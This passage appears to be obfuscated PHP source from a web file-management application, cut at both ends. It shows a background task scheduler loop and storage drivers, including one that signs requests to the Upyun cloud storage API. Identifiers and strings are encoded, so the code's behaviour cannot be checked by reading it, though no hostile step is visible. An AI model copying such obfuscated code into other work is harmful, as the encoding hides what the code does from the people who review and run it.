$É¼Ûá”¢[1627]); Session::$data = array(); Session::$sessionSign = $É¼Ûá”¢[12]; $GLOBALS[$É¼Ûá”¢[503]] = 1; Hook::bind($É¼Ûá”¢[1628], $É¼Ûá”¢[1629]); $çî×¢ = 0; while (!0) { self::cacheClear(); if (self::valueGet($É¼Ûá”¢[749]) != $É¼Ûá”¢[88]) { self::valueSet($É¼Ûá”¢[1623], $É¼Ûá”¢[197]); self::log($É¼Ûá”¢[1630]); die; } $Îñš÷ = time(); if ($Îñš÷ - $çî×¢ >= 60) { self::valueSet(array($É¼Ûá”¢[1623] => $É¼Ûá”¢[88], $É¼Ûá”¢[1624] => $Îñš÷), !1); $çî×¢ = $Îñš÷; } if (!file_exists(USER_SYSTEM . $É¼Ûá”¢[1631])) { self::valueSet(array($É¼Ûá”¢[1623] => $É¼Ûá”¢[197], $É¼Ûá”¢[749] => $É¼Ûá”¢[197]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $©µÉ„½Ù =& $_SERVER[ĞÂ¤àÓï]; http_close(); self::valueSet($©µÉ„½Ù[749], $©µÉ„½Ù[197]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($©µÉ„½Ù[1623] => $©µÉ„½Ù[197], $©µÉ„½Ù[749] => $©µÉ„½Ù[88]), !1); } public static function taskSwitch() { $œü³Û¸ó =& $_SERVER[ĞÂ¤àÓï]; $ãë•à³ = self::valueGet($œü³Û¸ó[749]) == $œü³Û¸ó[88] ? $œü³Û¸ó[197] : $œü³Û¸ó[88]; self::valueSet($œü³Û¸ó[749], $ãë•à³); } public static function shutdownEvent() { $Ùø½×·† =& $_SERVER[ĞÂ¤àÓï]; self::valueSet($Ùø½×·†[1623], $Ùø½×·†[197]); self::log($Ùø½×·†[1632]); } public static function config($ûŠŞÏÔ³, $¬™ğÎŒ) { self::valueSet($_SERVER[ĞÂ¤àÓï][749], $ûŠŞÏÔ³); } private static function taskRunAll() { $³Ø‚´òÏ =& $_SERVER[ĞÂ¤àÓï]; $Êë³ÒŠÚ = timeFloat(); $’‹ŞÀêä = Model($³Ø‚´òÏ[1633])->listData(); $›·÷ı† = count($’‹ŞÀêä); for ($¦à¸†‡Ø = 0; $¦à¸†‡Ø < $›·÷ı†; $¦à¸†‡Ø++) { $¦ÛúÀä· = $’‹ŞÀêä[$¦à¸†‡Ø]; if (!$¦ÛúÀä·[$³Ø‚´òÏ[399]] || $¦ÛúÀä·[$³Ø‚´òÏ[1634]] != $³Ø‚´òÏ[88]) { continue; } if (!self::taskTimeCheck($¦ÛúÀä·)) { continue; } self::taskRun($¦ÛúÀä·); } Hook::trigger($³Ø‚´òÏ[1635]); self::taskQueueRun($Êë³ÒŠÚ); } private static function taskQueueRun($œ¬ºÃ¨î) { $ÕçÌÒª = 10; while (!0) { $´¡Àó™ = TaskQueue::run(); if ($´¡Àó™ === !1) { break; } if (timeFloat() - $œ¬ºÃ¨î >= $ÕçÌÒª) { break; } } } private static function taskTimeCheck($È®•«ô) { $±ÚÊÔ”Ã =& $_SERVER[ĞÂ¤àÓï]; $şç‰ìè = json_decode($È®•«ô[$±ÚÊÔ”Ã[203]], !0); $½²û«Ä = intval($È®•«ô[$±ÚÊÔ”Ã[1624]]); $¦šÖÀ—‚ = strtotime($±ÚÊÔ”Ã[1636] . $şç‰ìè[$±ÚÊÔ”Ã[1637]] . $±ÚÊÔ”Ã[1638]) - strtotime($±ÚÊÔ”Ã[1639]); $äˆ§‘×í = time() - strtotime(date($±ÚÊÔ”Ã[1640]) . $±ÚÊÔ”Ã[1641]); $’”½£¯‘ = $äˆ§‘×í >= $¦šÖÀ—‚ && $äˆ§‘×í <= $¦šÖÀ—‚ + 3600; switch ($şç‰ìè[$±ÚÊÔ”Ã[33]]) { case $±ÚÊÔ”Ã[1642]: if (time() - $½²û«Ä < 3600 * 24 * 30) { return !1; } if ($şç‰ìè[$±ÚÊÔ”Ã[1642]] == date($±ÚÊÔ”Ã[1643]) && $’”½£¯‘) { return !0; } break; case $±ÚÊÔ”Ã[1644]: if (time() - $½²û«Ä < 3600 * 24 * 7) { return !1; } $²êã¬ù = date($±ÚÊÔ”Ã[1645]) == 0 ? 7 : date($±ÚÊÔ”Ã[1645]); if ($şç‰ìè[$±ÚÊÔ”Ã[1644]] == $²êã¬ù && $’”½£¯‘) { return !0; } break; case $±ÚÊÔ”Ã[1637]: if (time() - $½²û«Ä < 3600 * 24) { return !1; } if ($’”½£¯‘) { return !0; } break; case $±ÚÊÔ”Ã[1646]: if (time() - $½²û«Ä >= floatval($şç‰ìè[$±ÚÊÔ”Ã[1646]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $Â¾¤æÏ£ =& $_SERVER[ĞÂ¤àÓï]; static $ü†ÑÕ™  = 0; $Ö­òêŠõ = 300; if (!$ü†ÑÕ™ ) { $ü†ÑÕ™  = time(); } if (time() - $ü†ÑÕ™  < $Ö­òêŠõ) { return; } $ü†ÑÕ™  = time(); $°¢şÜü› = Model($Â¾¤æÏ£[513])->db($Â¾¤æÏ£[12]); if ($°¢şÜü›) { $°¢şÜü›->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($Â¾¤æÏ£[1647], $Â¾¤æÏ£[1648]); die; } } public static function taskRun($Å³Ø°Üã) { $ÅåïŸ° =& $_SERVER[ĞÂ¤àÓï]; self::log($ÅåïŸ°[1649] . $Å³Ø°Üã[$ÅåïŸ°[399]] . $ÅåïŸ°[1650] . $Å³Ø°Üã[$ÅåïŸ°[32]] . $ÅåïŸ°[1651] . $Å³Ø°Üã[$ÅåïŸ°[1652]]); Model($ÅåïŸ°[1633])->run($Å³Ø°Üã[$ÅåïŸ°[399]]); $Ü™é“® = timeFloat(); $·ù”ïÃ = $ÅåïŸ°[12]; switch ($Å³Ø°Üã[$ÅåïŸ°[33]]) { case $ÅåïŸ°[307]: $µë¦É„Ö = url_request($Å³Ø°Üã[$ÅåïŸ°[1652]], $ÅåïŸ°[230], !1, !1, !1, !1, 10); if ($µë¦É„Ö[$ÅåïŸ°[749]]) { $·ù”ïÃ = strlen($µë¦É„Ö[$ÅåïŸ°[1203]]); } break; case $ÅåïŸ°[229]: $·ù”ïÃ = Hook::apply($Å³Ø°Üã[$ÅåïŸ°[1652]]); default: break; } Model($ÅåïŸ°[1653])->add(array($ÅåïŸ°[1654] => $ÅåïŸ°[12], $ÅåïŸ°[1655] => $ÅåïŸ°[197], $ÅåïŸ°[33] => $ÅåïŸ°[1656] . $Å³Ø°Üã[$ÅåïŸ°[399]], $ÅåïŸ°[1657] => json_encode(array($ÅåïŸ°[32] => $Å³Ø°Üã[$ÅåïŸ°[32]], $ÅåïŸ°[1658] => timeFloat() - $Ü™é“®, $ÅåïŸ°[293] => $·ù”ïÃ)))); $™­¨Ë™ı = $·ù”ïÃ ? $ÅåïŸ°[1659] . $·ù”ïÃ : $ÅåïŸ°[12]; self::log($ÅåïŸ°[1660] . $Å³Ø°Üã[$ÅåïŸ°[399]] . $ÅåïŸ°[164] . $™­¨Ë™ı); return !0; } private static function valueGet($¢Ü¬Ë²) { $˜§°ú² =& $_SERVER[ĞÂ¤àÓï]; $›ÜìôÃ = $˜§°ú²[1661]; $ª¡áäÚÙ = Model($˜§°ú²[435])->get($¢Ü¬Ë², $›ÜìôÃ); if (is_null($ª¡áäÚÙ)) { Model($˜§°ú²[435])->set($˜§°ú²[749], $˜§°ú²[88], $›ÜìôÃ); Model($˜§°ú²[435])->set($˜§°ú²[1623], $˜§°ú²[197], $›ÜìôÃ); $ª¡áäÚÙ = Model($˜§°ú²[435])->get($¢Ü¬Ë², $›ÜìôÃ); } return $ª¡áäÚÙ; } private static function valueSet($Ï†Ûæö, $åíøÇé¡) { $»ïù£’ı =& $_SERVER[ĞÂ¤àÓï]; $ ŒÑ™«ù = $»ïù£’ı[1662]; CacheLock::lock($ ŒÑ™«ù); $Á¸œóÍ¬ = Model($»ïù£’ı[435])->set($Ï†Ûæö, $åíøÇé¡, $»ïù£’ı[1661]); CacheLock::unlock($ ŒÑ™«ù); return $Á¸œóÍ¬; } protected static function log($’›ı”™) { write_log($’›ı”™, $_SERVER[ĞÂ¤àÓï][1648]); } private static function cacheClear() { $´¯ßˆÃ =& $_SERVER[ĞÂ¤àÓï]; Cache::clearMemory(Model($´¯ßˆÃ[435])->cacheKey($´¯ßˆÃ[1661])); Cache::clearMemory(Model($´¯ßˆÃ[435])->cacheKey($´¯ßˆÃ[1663])); Model($´¯ßˆÃ[1633])->cacheClear(); self::closeDatabase(); } } goto dÅÀ÷¸ß´; Bƒ§Úºä¤: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($åíÊÒÍ¶, $¥ñ—¼¤ = 0) { parent::__construct(); $this->source = $åíÊÒÍ¶; $this->sourceSize = $¥ñ—¼¤; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($×·Ğ…§ˆ = false) { return $this->sourceSize; } public function getContent($ã¿±˜è³ = false) { return $this->fileSubstr($ã¿±˜è³, 0, $this->sourceSize); } public function fileSubstr($›˜ûÔ„ = false, $ÖáÏˆ™¯ = 0, $ÂÙÇ¸Ì‚ = 0) { if (!$ÂÙÇ¸Ì‚) { $ÂÙÇ¸Ì‚ = $this->sourceSize; } $‹ÇŠ¢ƒİ = $this->sourceSize - $ÖáÏˆ™¯; if ($ÂÙÇ¸Ì‚ >= $‹ÇŠ¢ƒİ) { $ÂÙÇ¸Ì‚ = $‹ÇŠ¢ƒİ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ÖáÏˆ™¯, $ÂÙÇ¸Ì‚); } if ($this->sourceType == self::TYPE_FILE) { if ($ÂÙÇ¸Ì‚ <= 0) { return $_SERVER[ĞÂ¤àÓï][12]; } $ìœ€«Äò = ftell($this->source); fseek_64($this->source, $ìœ€«Äò + $ÖáÏˆ™¯); $¶³ÄÄÆŸ = @fread($this->source, $ÂÙÇ¸Ì‚); fseek_64($this->source, $ìœ€«Äò); return $¶³ÄÄÆŸ; } } public function hashMd5($ÖÛ÷ëÄ¨ = false) { return md5($this->getContent()); } public static function hash($¦ØÄÌ¶Ä, $à·±¾˜ô = 0) { $‰µ¯®½Ì = new PathDriverStream($¦ØÄÌ¶Ä, $à·±¾˜ô); return $‰µ¯®½Ì->hashSimple($¦ØÄÌ¶Ä); } public static function md5($ŸİìŠÔ¤, $šÑŸçª = 0) { $ü„¯’ö´ = new PathDriverStream($ŸİìŠÔ¤, $šÑŸçª); return $ü„¯’ö´->hashMd5($ŸİìŠÔ¤); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\164\160\x3a\57\x2f\166\x30\56\141\x70\151\x2e\x75\x70\x79\165\x6e\x2e\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Ú¡”µóÕ) { parent::__construct(); $this->_init($Ú¡”µóÕ); } public function _init($€¾üÉğ) { $™İ·øûû =& $_SERVER[ĞÂ¤àÓï]; foreach ($€¾üÉğ as $°¤›’¤ => $Ç¯Õ‡€Ø) { if (isset($this->{$°¤›’¤})) { $this->{$°¤›’¤} = $Ç¯Õ‡€Ø; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($™İ·øûû[1463] . LNG($™İ·øûû[1394])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($†ä˜ÏÍ, $°ôª¿ØÆ = "\x47\x45\x54") { $ßÓßŠµ˜ =& $_SERVER[ĞÂ¤àÓï]; $øˆïÒò = gmdate($ßÓßŠµ˜[1427]); $ƒ§úç·À = base64_encode(hash_hmac($ßÓßŠµ˜[1464], "{$°ôª¿ØÆ}\46{$†ä˜ÏÍ}\46{$øˆïÒò}", md5("{$this->userpass}"), !0)); $‡úá¡‹ = array("\x41\x75\x74\150\157\162\x69\x7a\x61\164\151\157\x6e\x3a\x55\120\x59\125\116\40{$this->username}\72{$ƒ§úç·À}", "\x44\141\164\x65\x3a{$øˆïÒò}"); return $‡úá¡‹; } public function ussRequest($­š˜º‰, $÷ˆã¹•Ø = "\x47\105\124", $¨íûÓÛ× = false, $ï˜ßŞ±Ë = false, $øš¶úŸ‡ = false) { $ãÕ‰Òˆ =& $_SERVER[ĞÂ¤àÓï]; $­š˜º‰ = trim($­š˜º‰, $ãÕ‰Òˆ[8]); $…‚÷¡Ÿ€ = "\57{$this->bucket}\57{$­š˜º‰}"; $Š‡Ş¢ = $this->ussHeaders($…‚÷¡Ÿ€, $÷ˆã¹•Ø); if ($ï˜ßŞ±Ë) { $Š‡Ş¢ = array_merge($Š‡Ş¢, $ï˜ßŞ±Ë); } $•ığÔÆÜ = url_request($this->endpoint . $…‚÷¡Ÿ€, $÷ˆã¹•Ø, $¨íûÓÛ×, $Š‡Ş¢, $øš¶úŸ‡); if (!$•ığÔÆÜ) { return array($ãÕ‰Òˆ[1213] => !1, $ãÕ‰Òˆ[1203] => $ãÕ‰Òˆ[1465]); } if (strtolower($÷ˆã¹•Ø) == $ãÕ‰Òˆ[196] || in_array($•ığÔÆÜ[$ãÕ‰Òˆ[1213]], array($ãÕ‰Òˆ[1319], $ãÕ‰Òˆ[1466]))) { $¨íûÓÛ× = $•ığÔÆÜ[$ãÕ‰Òˆ[1467]]; } else { $¨íûÓÛ× = json_decode($•ığÔÆÜ[$ãÕ‰Òˆ[1203]], !0); if (!$¨íûÓÛ×) { $¨íûÓÛ× = $•ığÔÆÜ[$ãÕ‰Òˆ[1203]]; } else { if (!$•ığÔÆÜ[$ãÕ‰Òˆ[749]] && isset($¨íûÓÛ×[$ãÕ‰Òˆ[1468]])) { $¨íûÓÛ× = $¨íûÓÛ×[$ãÕ‰Òˆ[1468]]; } } } return array($ãÕ‰Òˆ[1213] => $•ığÔÆÜ[$ãÕ‰Òˆ[749]], $ãÕ‰Òˆ[1203] => $¨íûÓÛ×); } public function mkfile($Çé¯Á, $û€Œâ = '', $úšÉõÑœ = REPEAT_RENAME) { if ($this->setContent($Çé¯Á, $û€Œâ)) { return $this->getPathOuter($Çé¯Á); } return !1; } public function mkdir($ ığÇ’·, $”Úæ§µÜ = REPEAT_SKIP) { $óŠ¨Ëª¨ =& $_SERVER[ĞÂ¤àÓï]; $ªÉ³Ë’à = trim($ ığÇ’·, $óŠ¨Ëª¨[8]); if ($this->_isFolder($ªÉ³Ë’à)) { return $this->getPathOuter($ªÉ³Ë’à); } $ßü©Ê•è = array($óŠ¨Ëª¨[1469]); $…®¾ óœ = $this->ussRequest($ªÉ³Ë’à, $óŠ¨Ëª¨[226], !1, $ßü©Ê•è); return $…®¾ óœ[$óŠ¨Ëª¨[1213]] ? $this->getPathOuter($ªÉ³Ë’à) : !1; } public function copyFile($ı²×Æäµ, $î×ê¤›«) { $›…±â¹ú =& $_SERVER[ĞÂ¤àÓï]; $êªµ†Öõ = array($›…±â¹ú[1470] . "\57{$this->bucket}\x2f{$ı²×Æäµ}", $›…±â¹ú[1471]); $šƒœÒ¯ä = $this->ussRequest($î×ê¤›«, $›…±â¹ú[228], !1, $êªµ†Öõ); return $šƒœÒ¯ä[$›…±â¹ú[1213]] ? !0 : $this->getPathOuter($î×ê¤›«); } public function moveFile($¥ûóÛ¡Í, $˜İ¡Ş) { $¹©Ğ¦šü =& $_SERVER[ĞÂ¤àÓï]; $şÂçêÉæ = array($¹©Ğ¦šü[1472] . "\x2f{$this->bucket}\x2f{$¥ûóÛ¡Í}", $¹©Ğ¦šü[1471]); $‚²İÂ‡£ = $this->ussRequest($˜İ¡Ş, $¹©Ğ¦šü[228], !1, $şÂçêÉæ); return $‚²İÂ‡£[$¹©Ğ¦šü[1213]] ? !0 : $this->getPathOuter($˜İ¡Ş); } public function delFile($Äš€§€) { $¼ò–Şòá =& $_SERVER[ĞÂ¤àÓï]; $Ò•ş„ì¨ = $this->ussRequest($Äš€§€, $¼ò–Şòá[1473]); return $Ò•ş„ì¨[$¼ò–Şòá[1213]] ? !0 : !1; } public function delFolder($Ñ‹ªªİ) { $ˆˆœ“Ûœ =& $_SERVER[ĞÂ¤àÓï]; if (!$this->exist($Ñ‹ªªİ)) { return !0; } $this->listItemCache = !1; $§¸ğ Óµ = $õëÀòÈ± = array(); $this->fileList($Ñ‹ªªİ, $§¸ğ Óµ, $õëÀòÈ±, !0); $this->listItemCache = !0; foreach ($õëÀòÈ± as $Ú³›ªùÍ) { $Ï…²î‹“ = $this->ussRequest($Ú³›ªùÍ[$ˆˆœ“Ûœ[32]], $ˆˆœ“Ûœ[1473]); if (!$Ï…²î‹“[$ˆˆœ“Ûœ[1213]]) { return !1; } } foreach ($§¸ğ Óµ as $“ª¢Í¥º) { $Ï…²î‹“ = $this->ussRequest($“ª¢Í¥º, $ˆˆœ“Ûœ[1473]); if (!$Ï…²î‹“[$ˆˆœ“Ûœ[1213]]) { return !1; } } $Ï…²î‹“ = $this->ussRequest($Ñ‹ªªİ, $ˆˆœ“Ûœ[1473]); return $Ï…²î‹“[$ˆˆœ“Ûœ[1213]]; } public function rename($Ñà¨‡»¹, $ë³ôÄ‰) { if ($this->isFile($Ñà¨‡»¹)) { $ë³ôÄ‰ = get_path_father($Ñà¨‡»¹) . $ë³ôÄ‰; return $this->moveFile($Ñà¨‡»¹, $ë³ôÄ‰); } return $this->renameObject($Ñà¨‡»¹, $ë³ôÄ‰); } public function fileInfo($ƒ¦¸è©å, $›£·ƒÌ = false, $Ÿ–Å¤¶ = array()) { $‡ŒõÚû =& $_SERVER[ĞÂ¤àÓï]; $í¤Û…À = array($‡ŒõÚû[32] => $this->pathThis($ƒ¦¸è©å), $‡ŒõÚû[84] => $this->getPathOuter($‡ŒõÚû[8] . $ƒ¦¸è©å), $‡ŒõÚû[33] => $‡ŒõÚû[199], $‡ŒõÚû[76] => isset($Ÿ–Å¤¶[$‡ŒõÚû[76]]) ? $Ÿ–Å¤¶[$‡ŒõÚû[76]] : 0, $‡ŒõÚû[174] => $this->ext($ƒ¦¸è©å)); if ($›£·ƒÌ) { return $í¤Û…À; } $í¤Û…À[$‡ŒõÚû[200]] = $í¤Û…À[$‡ŒõÚû[85]] = 0; $í¤Û…À[$‡ŒõÚû[201]] = $í¤Û…À[$‡ŒõÚû[202]] = !0; if (empty($Ÿ–Å¤¶)) { $Ÿ–Å¤¶ = $this->objectMeta($ƒ¦¸è©å); if (!$Ÿ–Å¤¶) { return $í¤Û…À; } } $í¤Û…À[$‡ŒõÚû[200]] = intval($Ÿ–Å¤¶[$‡ŒõÚû[1474]]); $í¤Û…À[$‡ŒõÚû[85]] = intval($Ÿ–Å¤¶[$‡ŒõÚû[1475]]); $í¤Û…À[$‡ŒõÚû[76]] = $Ÿ–Å¤¶[$‡ŒõÚû[76]]; return $í¤Û…À; } public function folderInfo($–ßŞôå, $ì˜ä¿¯Ø = false) { $¤è¦õ¢ =& $_SERVER[ĞÂ¤àÓï]; $Ì‹‹øıé = array($¤è¦õ¢[32] => $this->pathThis($–ßŞôå), $¤è¦õ¢[84] => $this->getPathOuter($¤è¦õ¢[8] . $–ßŞôå), $¤è¦õ¢[33] => $¤è¦õ¢[75]); if ($ì˜ä¿¯Ø) { return $Ì‹‹øıé; } $Ì‹‹øıé[$¤è¦õ¢[200]] = $Ì‹‹øıé[$¤è¦õ¢[85]] = 0; $Ì‹‹øıé[$¤è¦õ¢[201]] = $Ì‹‹øıé[$¤è¦õ¢[202]] = !0; if (empty($½¿Øñµß)) { $½¿Øñµß = $this->objectMeta($–ßŞôå); if (!$½¿Øñµß) { return $Ì‹‹øıé; } } $Ì‹‹øıé[$¤è¦õ¢[200]] = intval($½¿Øñµß[$¤è¦õ¢[1474]]); $Ì‹‹øıé[$¤è¦õ¢[85]] = intval($½¿Øñµß[$¤è¦õ¢[1475]]); return $Ì‹‹øıé; } private function listObjs($ì¿ÉÄ³á, $Ò¥©ûŸ = 0, $©ÇñŸ ¦ = 1000) { $Ö¨æ£ =& $_SERVER[ĞÂ¤àÓï]; $íàúğ‡£ = array($Ö¨æ£[1476], $Ö¨æ£[1477] . $©ÇñŸ ¦); if ($Ò¥©ûŸ) { $íàúğ‡£[] = $Ö¨æ£[1478] . $Ò¥©ûŸ; } $øóÏŠ´› = $this->ussRequest($ì¿ÉÄ³á, $Ö¨æ£[230], !1, $íàúğ‡£); return !$øóÏŠ´›[$Ö¨æ£[1213]] ? !1 : $øóÏŠ´›[$Ö¨æ£[1203]]; } private function fileList($ï¿‹Ş¿×, &$òƒ©…†¯, &$à¿¹ãÕ—, $˜íÈ¸İ = false) { $¾ïäƒÉ =& $_SERVER[ĞÂ¤àÓï]; $‹Çâ Íß = $¾ïäƒÉ[12]; $´áÉ –½ = 1000; $ÒÌ¢ûø» = rtrim($ï¿‹Ş¿×, $¾ïäƒÉ[8]) . $¾ïäƒÉ[8]; while (!0) { check_abort(); $öóŸÜÔ€ = $this->listObjs($ï¿‹Ş¿×, $‹Çâ Íß, $´áÉ –½); if (!$öóŸÜÔ€) { return !1; } $‹Çâ Íß = isset($öóŸÜÔ€[$¾ïäƒÉ[1479]]) ? $öóŸÜÔ€[$¾ïäƒÉ[1479]] : $¾ïäƒÉ[12]; $¤ó±Ñè¡ = isset($öóŸÜÔ€[$¾ïäƒÉ[1480]]) ? $öóŸÜÔ€[$¾ïäƒÉ[1480]] : array(); foreach ($¤ó±Ñè¡ as $¾Íó—²ê) { $û®œÆÄ… = $¾Íó—²ê[$¾ïäƒÉ[33]] == $¾ïäƒÉ[75] ? !0 : !1; $¶Ã¸½ìî = ltrim($ÒÌ¢ûø» . $¾Íó—²ê[$¾ïäƒÉ[32]], $¾ïäƒÉ[8]) . ($û®œÆÄ… ? $¾ïäƒÉ[8] : $¾ïäƒÉ[12]); $ŸáÓ§¬™ = array($¾ïäƒÉ[32] => $¶Ã¸½ìî, $¾ïäƒÉ[33] => $û®œÆÄ… ? $¾ïäƒÉ[75] : $¾ïäƒÉ[199], $¾ïäƒÉ[76] => $¾Íó—²ê[$¾ïäƒÉ[337]], $¾ïäƒÉ[1475] => $¾Íó—²ê[$¾ïäƒÉ[1481]]); $this->cacheMethodInfoSet($¶Ã¸½ìî, $û®œÆÄ…, $ŸáÓ§¬™); if ($û®œÆÄ…) { $òƒ©…†¯[] = $¶Ã¸½ìî; if ($˜íÈ¸İ) { $this->fileList($¶Ã¸½ìî, $òƒ©…†¯, $à¿¹ãÕ—, $˜íÈ¸İ); } continue; } $à¿¹ãÕ—[] = $ŸáÓ§¬™; } if (count($¤ó±Ñè¡) < $´áÉ –½) { break; } } $this->cacheMethodInfoSet($ï¿‹Ş¿×, !0); } public function listPath($Æ·ÀƒÂ³, $İÓø¿ë¯ = false) { $„Å–Ñ„Œ =& $_SERVER[ĞÂ¤àÓï]; $’İƒÒâë = $”ÕÓ‘é = array(); $this->fileList($Æ·ÀƒÂ³, $’İƒÒâë, $”ÕÓ‘é); foreach ($’İƒÒâë as $êÖç€àı => $â¼”¸ÎÕ) { $’İƒÒâë[$êÖç€àı] = $this->folderInfo($â¼”¸ÎÕ, $İÓø¿ë¯); } foreach ($”ÕÓ‘é as $êÖç€àı => $â¼”¸ÎÕ) { $”ÕÓ‘é[$êÖç€àı] = $this->fileInfo($â¼”¸ÎÕ[$„Å–Ñ„Œ[32]], $İÓø¿ë¯, $â¼”¸ÎÕ); } return array($„Å–Ñ„Œ[82] => $’İƒÒâë, $„Å–Ñ„Œ[83] => $”ÕÓ‘é); } public function has($»‰ÖäÊ, $Ä¶…Øõï = false, $·‚ø”ğü = true) { $°üÛ†‘É =& $_SERVER[ĞÂ¤àÓï]; $Ã·¹ˆ = $°üÛ†‘É[12]; $¬½ßÍ¡ = 500; $—¢³“Ç› = 0; $Ş¢æÄ™ = 0; $áÈîúü = rtrim($»‰ÖäÊ, $°üÛ†‘É[8]) . $°üÛ†‘É[8]; while (!0) { check_abort(); $æ±‹¦ƒÖ = $this->listObjs($»‰ÖäÊ, $Ã·¹ˆ, $¬½ßÍ¡); if (!$æ±‹¦ƒÖ) { return !1; } $Ã·¹ˆ = isset($æ±‹¦ƒÖ[$°üÛ†‘É[1479]]) ? $æ±‹¦ƒÖ[$°üÛ†‘É[1479]] : $°üÛ†‘É[12]; $úØå£Îò = isset($æ±‹¦ƒÖ[$°üÛ†‘É[1480]]) ? $æ±‹¦ƒÖ[$°üÛ†‘É[1480]] : array(); if (empty($úØå£Îò)) { break; } $´ü½ÔÆ = array_filter($úØå£Îò, function ($€Î‰ç‡) { $íŒûÙ§ =& $_SERVER[ĞÂ¤àÓï]; return $€Î‰ç‡[$íŒûÙ§[33]] == $íŒûÙ§[75]; }); $ÊìÚ¸ôÆ = count($úØå£Îò); $´ü½ÔÆ = count($´ü½ÔÆ); $¤¼øâ”Ã = $ÊìÚ¸ôÆ - $´ü½ÔÆ; if ($Ä¶…Øõï) { $Ş¢æÄ™ += $´ü½ÔÆ; $—¢³“Ç› += $¤¼øâ”Ã; if ($ÊìÚ¸ôÆ < $¬½ßÍ¡) { break; } continue; } if ($·‚ø”ğü) { if ($¤¼øâ”Ã) { return !0; } } else { if ($´ü½ÔÆ) { return !0; } } if ($ÊìÚ¸ôÆ < $¬½ßÍ¡) { break; } } if ($Ä¶…Øõï) { return array($°üÛ†‘É[207] => $—¢³“Ç›, $°üÛ†‘É[208] => $Ş¢æÄ™); } return !1; } public function listAll($–³»€‘Ë) { $ç›¿ÜÃÓ =& $_SERVER[ĞÂ¤àÓï]; $ê±Õ—€… = $İÎßİ°ô = array(); $this->fileList($–³»€‘Ë, $ê±Õ—€…, $İÎßİ°ô, !0); $°Û«¿ = array(); foreach ($İÎßİ°ô as $¿ßÂ¬’¢) { $°Û«¿[$¿ßÂ¬’¢[$ç›¿ÜÃÓ[32]]] = $¿ßÂ¬’¢[$ç›¿ÜÃÓ[76]]; } foreach ($ê±Õ—€… as $¿ßÂ¬’¢) { if (is_string($¿ßÂ¬’¢)) { $°Û«¿[$¿ßÂ¬’¢] = 0; } } return $this->listAllFiles($–³»€‘Ë, array_keys($°Û«¿), $°Û«¿); } public function canRead($ÅÑ¨ºÌ©) { return $this->exist($ÅÑ¨ºÌ©) ? !0 : !1; } public function canWrite($°©‚) { return $this->exist($°©‚) ? !0 : !1; } public function getContent($Ñ®ç­İï) { return $this->fileSubstr($Ñ®ç­İï, 0, -1); } public function setContent($”¸üÓÒ, $ò½§Íó = '') { $îş×˜¥ª =& $_SERVER[ĞÂ¤àÓï]; if (!$ò½§Íó) { $íÒ÷¾ƒ¸ = $this->ussRequest($”¸üÓÒ, $îş×˜¥ª[226]); return $íÒ÷¾ƒ¸[$îş×˜¥ª[1213]]; } $şÖ†®³Ô = $this->tempFile($this->pathThis($”¸üÓÒ)); file_put_contents($şÖ†®³Ô, $ò½§Íó); if ($this->upload($”¸üÓÒ, $şÖ†®³Ô)) { $this->tempFileRemve($şÖ†®³Ô); return !0; } return !1; } public function fileSubstr($Ñ‘›…ü, $ÁÑñøí…, $×ªÓùçÃ) { $´İ©ë¶Ğ =& $_SERVER[ĞÂ¤àÓï]; if (!($½€½éİ‡ = $this->link($Ñ‘›…ü))) { return !1; } $è»¿’¬ = !1; if ($×ªÓùçÃ > 0) { $µ–»õ•Õ = $ÁÑñøí… + $×ªÓùçÃ - 1; $è»¿’¬ = array($´İ©ë¶Ğ[1442] . $ÁÑñøí… . $´İ©ë¶Ğ[386] . $µ–»õ•Õ); } $‹ñè‹å = url_request($½€½éİ‡, $´İ©ë¶Ğ[230], !1, $è»¿’¬); return $‹ñè‹å[$´İ©ë¶Ğ[749]] ? $‹ñè‹å[$´İ©ë¶Ğ[1203]] : !1; } public function upload($ ·ÇŒ„, $ç—ÅÁû¿, $¸›İÔ ¸ = false, $½–½ğæ¶ = REPEAT_REPLACE) { $£éŸî£¬ =& $_SERVER[ĞÂ¤àÓï]; $ëú„Ç‰ = IO::size($ç—ÅÁû¿); if ($ëú„Ç‰ <= 1024 * 1024 * 200) { $­ü¯Õ = array($£éŸî£¬[1482] . $ç—ÅÁû¿); $œºö§’Í = $this->ussRequest($ ·ÇŒ„, $£éŸî£¬[228], $­ü¯Õ); return $œºö§’Í[$£éŸî£¬[1213]] ? $this->getPathOuter($ ·ÇŒ„) : !1; } $¤ƒĞÁ = 1024 * 1024 * 10; $‡¤Ò¨ú = array($£éŸî£¬[1483], $£éŸî£¬[1484] . $ëú„Ç‰, $£éŸî£¬[1485], $£éŸî£¬[1486] . $¤ƒĞÁ); $œºö§’Í = $this->ussRequest($ ·ÇŒ„, $£éŸî£¬[228], !1, $‡¤Ò¨ú); if (!$œºö§’Í[$£éŸî£¬[1213]]) { return !1; } $‰ò‘ı€‹ = $œºö§’Í[$£éŸî£¬[1203]]; $¸½Ğ¡Û = 0; $Í¤¹öÃÓ = $‰ò‘ı€‹[$£éŸî£¬[1487]]; $ÍûŒÜÂ± = fopen($ç—ÅÁû¿, $£éŸî£¬[1391]); if (!$ÍûŒÜÂ±) { return !1; } do { $éËú½îÌ = $‰ò‘ı€‹[$£éŸî£¬[1488]]; fseek_64($ÍûŒÜÂ±, $¸½Ğ¡Û); $¤„¾ŠÙÆ = fread($ÍûŒÜÂ±, $éËú½îÌ); $Æ¶”·«– = 0; do { $Æ¶”·«–++; $‰ò‘ı€‹ = $this->uploadPart($ ·ÇŒ„, $‰ò‘ı€‹, $¤„¾ŠÙÆ); } while (!$‰ò‘ı€‹ && $Æ¶”·«– < 3); if (!$‰ò‘ı€‹) { return !1; } $Í¤¹öÃÓ = 